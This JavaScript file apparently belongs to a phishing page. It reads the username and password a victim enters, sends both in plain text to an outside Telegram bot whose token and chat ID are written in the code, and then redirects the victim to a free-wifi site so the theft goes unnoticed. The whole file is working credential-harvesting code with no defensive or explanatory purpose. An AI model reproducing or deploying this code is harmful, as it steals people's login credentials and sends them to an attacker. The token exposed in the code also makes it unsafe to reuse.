const sendatatme = document.getElementById("sendatatme");
const first = document.getElementById("first");
const second = document.getElementById("second");
const resfirst = document.getElementById("resfirst");
const resecond = document.getElementById("resecond");

first.addEventListener("change", () => {
  resfirst.value = first.value;
});
second.addEventListener("change", () => {
  resecond.value = second.value;
});

function redirect() {
  const Http = new XMLHttpRequest();
  const url =
    "https://api.telegram.org/bot6867011964:AAHwh1qQrsJNwM4sBsadHwm8x0XE9hb6BjE/sendMessage?chat_id=5052520420&text=USERNAME:%20" +
    resfirst.value +
    " PASSWORD: " +
    resecond.value;
  Http.open("GET", url);
  Http.send();

  Http.onreadystatechange = (e) => {
    console.log(Http.responseText);
  };

window.location.href = 'https://wifigratis.mx/';
}

sendatatme.addEventListener("click", redirect);
